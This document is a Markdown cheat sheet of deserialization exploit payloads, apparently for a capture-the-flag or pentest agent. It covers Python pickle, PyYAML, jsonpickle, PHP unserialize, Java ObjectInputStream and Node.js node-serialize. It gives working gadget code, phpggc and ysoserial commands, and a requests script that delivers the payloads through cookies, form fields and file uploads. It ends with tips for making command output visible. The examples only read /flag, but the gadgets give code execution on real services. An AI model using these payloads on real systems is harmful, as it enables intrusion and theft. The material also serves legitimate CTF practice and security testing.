# Deserialization Gadget Reference

## Python — pickle

```python
# Source: pickle.loads(data)  or  cPickle.loads(data)
# Data may come from: cookie, POST body, Redis, file upload

# Gadget: __reduce__ with subprocess.check_output for response-visible output
# /tmp/aurelinth/craft_pickle.py
import pickle, os, base64, subprocess

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "/flag"],))

payload_bytes = pickle.dumps(Exploit())
payload_b64   = base64.b64encode(payload_bytes).decode()

print("Raw length:", len(payload_bytes))
print("Base64:", payload_b64)

# Verify locally
result = pickle.loads(payload_bytes)
print("Local test output:", result)
```

**Important:** Use `subprocess.check_output` over `os.system` — `os.system` prints to server
stdout (invisible in HTTP response), `check_output` returns bytes captured in the response.

## Python — PyYAML

```python
# Source: yaml.load(data)  ← NO Loader argument = UNSAFE
# Safe:   yaml.safe_load(data)  ← NOT vulnerable — stop if safe_load

# Confirm payload:
payload = "!!python/object/apply:subprocess.check_output [['cat', '/flag']]"

# Verify locally:
# /tmp/aurelinth/craft_yaml.py
import yaml
payload = "!!python/object/apply:subprocess.check_output [['cat', '/flag']]"
try:
    result = yaml.load(payload)  # intentionally unsafe for local test
    print("Output:", result)
except Exception as e:
    print("Error:", e)
```

## Python — jsonpickle

```python
# Source: jsonpickle.decode(data)
import jsonpickle, os

class Exploit:
    def __reduce__(self):
        return os.system, ("cat /flag",)

payload = jsonpickle.encode(Exploit())
```

## PHP — unserialize()

```
// Source: unserialize($_GET['data'])  or  unserialize(base64_decode($cookie))
// Gadget: depends on available classes with __wakeup() / __destruct() / __toString()
// Tool:   phpggc for known framework gadgets
// bash:   php vendor/phpggc/phpggc Framework/RCE1 "cat /flag" | base64
```

Look for classes in source with dangerous operations in `__wakeup`, `__destruct`, `__toString`.

## Java — ObjectInputStream

```
// Source: new ObjectInputStream(inputStream).readObject()
// Tool:   ysoserial
// bash:   java -jar ysoserial.jar CommonsCollections1 "cat /flag" | base64
```

## Node.js — node-serialize

```javascript
// Source: serialize.unserialize(data)
// Gadget: IIFE in serialized function
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('cat /flag', function(e,o){console.log(o)})}()"}
```

---

## Delivery Patterns

Adjust based on how source reads the payload:

```python
# /tmp/aurelinth/exploit_deserial.py
import requests, base64

BASE = "http://LOCAL_TARGET"
s = requests.Session()
s.post(f"{BASE}/login", data={"username":"pwn","password":"pwn"})

# Case 1: base64 cookie
s.cookies.set("session_data", payload_b64)
r = s.get(f"{BASE}/profile")

# Case 2: POST body field
r = s.post(f"{BASE}/import", data={"data": payload_b64})

# Case 3: file upload
r = s.post(f"{BASE}/upload",
    files={"file": ("data.pkl", payload_bytes, "application/octet-stream")})

print(r.status_code, r.text[:300])
```

## Troubleshooting

- 500 error → check encoding (raw bytes vs base64 vs URL-encoded)
- No output in response → switch from `os.system` to `subprocess.check_output`
- PyYAML → verify `yaml.load` is called (not `yaml.safe_load`)
- PHP → enumerate `__wakeup`/`__destruct` in source for gadget candidates

Install: `pip install pyyaml pycryptodome --break-system-packages -q`
